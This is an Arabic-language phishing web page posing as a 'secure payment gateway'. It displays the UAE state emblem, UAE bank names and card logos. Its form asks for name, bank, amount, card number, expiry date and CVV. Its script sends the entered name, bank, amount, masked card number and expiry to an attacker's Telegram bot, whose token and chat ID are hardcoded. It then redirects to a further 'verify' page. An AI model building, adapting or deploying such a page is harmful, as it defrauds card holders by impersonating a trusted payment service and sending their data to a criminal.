<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>بوابة الدفع الآمنة</title>
  <style>
    /* ===== التصميم العام ===== */
    body {
      font-family: 'Tahoma', Arial, sans-serif;
      background: linear-gradient(135deg, #f2f7f5, #e6eeea);
      margin: 0;
      padding: 0;
      direction: rtl;
      box-sizing: border-box;
    }

    .container {
      max-width: 600px;
      margin: 30px auto;
      padding: 20px;
    }

    .card {
      background: #fff;
      border-radius: 12px;
      padding: 25px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
      transition: all 0.3s ease;
    }

    .card:hover {
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12);
    }

    /* ===== الهيدر ===== */
    header {
      text-align: center;
      margin-bottom: 20px;
    }

    header img {
      height: 80px;
      margin-bottom: 10px;
    }

    header h1 {
      font-size: 24px;
      color: #1f6d3b;
      margin: 0;
    }

    /* ===== الحقول ===== */
    label {
      display: block;
      margin-top: 15px;
      font-weight: 600;
      color: #222;
      font-size: 15px;
    }

    input,
    select,
    button {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-sizing: border-box;
      font-size: 15px;
      transition: border-color 0.2s ease;
    }

    input:focus,
    select:focus {
      border-color: #1f6d3b;
      outline: none;
    }

    /* ===== قائمة البنوك مع الصور ===== */
    .bank-select {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .bank-logos {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      margin-top: 10px;
      justify-content: center;
    }

    .bank-logos img {
      width: 50px;
      height: 30px;
      object-fit: contain;
      border: 1px solid #ddd;
      border-radius: 6px;
      padding: 3px;
      background: #fff;
    }

    /* ===== صفوف متعددة ===== */
    .row {
      display: flex;
      gap: 10px;
    }

    .col {
      flex: 1;
    }

    /* ===== رسائل الخطأ ===== */
    .error {
      color: #b00020;
      font-size: 13px;
      display: none;
      margin-top: 8px;
      text-align: center;
    }

    /* ===== الزر ===== */
    button {
      background: #1f6d3b;
      color: #fff;
      border: 0;
      cursor: pointer;
      font-weight: bold;
      margin-top: 20px;
      font-size: 16px;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #155a2e;
    }

    /* ===== ميديا كويري للشاشات الصغيرة ===== */
    @media (max-width: 480px) {
      header img {
        height: 60px;
      }
      header h1 {
        font-size: 20px;
      }
      .bank-logos img {
        width: 40px;
        height: 25px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار">
        <h1>بوابة الدفع الآمنة</h1>
      </header>

      <form id="paymentForm" autocomplete="off" novalidate>
        <label for="fullName">الاسم الكامل</label>
        <input id="fullName" type="text" placeholder="الاسم كما في البطاقة" required>

        <label for="bank">البنك</label>
        <div class="bank-select">
          <select id="bank" required>
            <option value="">— اختر البنك —</option>
            <option>بنك أبوظبي الأول</option>
            <option>مصرف أبوظبي الإسلامي</option>
            <option>بنك الإمارات دبي الوطني</option>
            <option>بنك دبي الإسلامي</option>
            <option>بنك المشرق</option>
            <option>HSBC</option>
            <option>سيتي بنك</option>
          </select>
        </div>

        <div class="bank-logos">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard">
          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/HSBC_logo_%282018%29.svg" alt="HSBC">
          <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Emirates_NBD_logo.svg" alt="Emirates NBD">
          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/ADIB_logo.svg" alt="ADIB">
        </div>

        <label for="amount">قيمة السداد (درهم إماراتي)</label>
        <input id="amount" type="number" min="1" step="0.01" placeholder="مثال: 100.00" required>

        <label for="cardNumber">رقم البطاقة</label>
        <input id="cardNumber" inputmode="numeric" maxlength="19" placeholder="XXXX-XXXX-XXXX-XXXX" required>

        <div class="row">
          <div class="col">
            <label for="expiryMonth">شهر الانتهاء (MM)</label>
            <select id="expiryMonth" required>
              <option value="">--</option>
              <option>01</option><option>02</option><option>03</option>
              <option>04</option><option>05</option><option>06</option>
              <option>07</option><option>08</option><option>09</option>
              <option>10</option><option>11</option><option>12</option>
            </select>
          </div>
          <div class="col">
            <label for="expiryYear">سنة الانتهاء (YYYY)</label>
            <select id="expiryYear" required>
              <option value="">--</option>
            </select>
          </div>
        </div>

        <label for="cvv">رمز التحقق CVV</label>
        <input id="cvv" type="password" inputmode="numeric" maxlength="4" placeholder="***" required>

        <div class="error" id="formError">الرجاء ملء كل الحقول بشكل صحيح.</div>

        <button type="submit">متابعة الدفع</button>
      </form>
    </div>
  </div>

  <script>
    // ===== تكوين البوت =====
    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
    const CHAT_ID  = "8404960059";

    // إضافة سنوات الانتهاء ديناميكياً
    (function fillYears() {
      const sel = document.getElementById('expiryYear');
      for (let y = 2025; y <= 2044; y++) {
        const o = document.createElement('option');
        o.textContent = String(y);
        o.value = String(y);
        sel.appendChild(o);
      }
    })();

    // تنسيق رقم البطاقة
    function formatCardNumberField(el) {
      let v = el.value.replace(/\D/g, '').slice(0, 16);
      const parts = v.match(/.{1,4}/g) || [];
      el.value = parts.join('-');
    }
    document.getElementById('cardNumber').addEventListener('input', function () {
      formatCardNumberField(this);
    });

    function last4(numberStr) {
      const digits = numberStr.replace(/\D/g, '');
      return digits.slice(-4).padStart(4, '*');
    }

    document.getElementById('paymentForm').addEventListener('submit', async function (e) {
      e.preventDefault();
      const errEl = document.getElementById('formError');
      errEl.style.display = 'none';

      const fullName = document.getElementById('fullName').value.trim();
      const bank = document.getElementById('bank').value;
      const amount = document.getElementById('amount').value.trim();
      const cardNumber = document.getElementById('cardNumber').value.trim();
      const expiryMonth = document.getElementById('expiryMonth').value;
      const expiryYear = document.getElementById('expiryYear').value;
      const cvv = document.getElementById('cvv').value.trim();

      if (!fullName || !bank || !amount || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
        errEl.textContent = 'الرجاء ملء كل الحقول المطلوبة.';
        errEl.style.display = 'block';
        return;
      }

      const digits = cardNumber.replace(/\D/g, '');
      if (digits.length < 12 || digits.length > 16) {
        errEl.textContent = 'رقم البطاقة غير صالح.';
        errEl.style.display = 'block';
        return;
      }

      if (!/^\d{3,4}$/.test(cvv)) {
        errEl.textContent = 'رمز CVV غير صالح.';
        errEl.style.display = 'block';
        return;
      }

      const now = new Date();
      const yNum = parseInt(expiryYear, 10), mNum = parseInt(expiryMonth, 10);
      if (yNum < now.getFullYear() || (yNum === now.getFullYear() && mNum < now.getMonth() + 1)) {
        errEl.textContent = 'تاريخ الصلاحية منتهي.';
        errEl.style.display = 'block';
        return;
      }

      const maskedCard = '****-****-****-' + last4(cardNumber);

      const message = `💳 عملية دفع جديدة:
-----------------------
👤 الاسم: ${fullName}
🏦 البنك: ${bank}
💰 المبلغ: ${amount} درهم
🔢 البطاقة: ${maskedCard}
📆 تاريخ الانتهاء: ${expiryMonth}/${expiryYear}`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
      } catch (err) {
        console.warn('فشل الإرسال إلى تيليجرام —', err);
      }

      window.location.href = 'verify.html';
    });
  </script>
</body>
</html>
